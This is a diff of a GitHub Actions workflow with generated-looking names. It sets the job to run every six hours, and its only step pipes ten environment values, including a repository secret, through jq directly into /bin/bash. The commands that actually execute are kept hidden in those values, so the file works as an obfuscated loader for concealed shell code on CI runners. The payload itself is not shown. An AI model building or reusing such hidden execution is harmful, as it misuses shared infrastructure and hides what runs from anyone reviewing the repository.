@@ -1,19 +1,27 @@
 name: liutang19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
+    - cron: '55 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liutang19871010
         env:
-          dg90212: ${{ secrets.dg90212 }}
+          rzkrc85117: ${{ secrets.rzkrc85117 }}
         run: |
-          echo $dg90212 | jq -r .uzkuu6885 | /bin/bash
-          echo $d0241 | jq -r .cith45093 | /bin/bash
-          echo $rp0078 | jq -r .fyfz5539 | /bin/bash
-          echo $oeam958 | jq -r .dgnqk15803 | /bin/bash
+          echo $rzkrc85117 | jq -r .ze313 | /bin/bash
+          echo $ri657 | jq -r .r72 | /bin/bash
+          echo $yvpci3569 | jq -r .sy7685 | /bin/bash
+          echo $f11532 | jq -r .oemo24 | /bin/bash
+          echo $tyww25 | jq -r .kjl7595 | /bin/bash
+          echo $d8 | jq -r .dbate11 | /bin/bash
+          echo $km20 | jq -r .ixi27 | /bin/bash
+          echo $ugqe1 | jq -r .emux55061 | /bin/bash
+          echo $ni8851 | jq -r .z639 | /bin/bash
+          echo $fu92261 | jq -r .q0 | /bin/bash
 
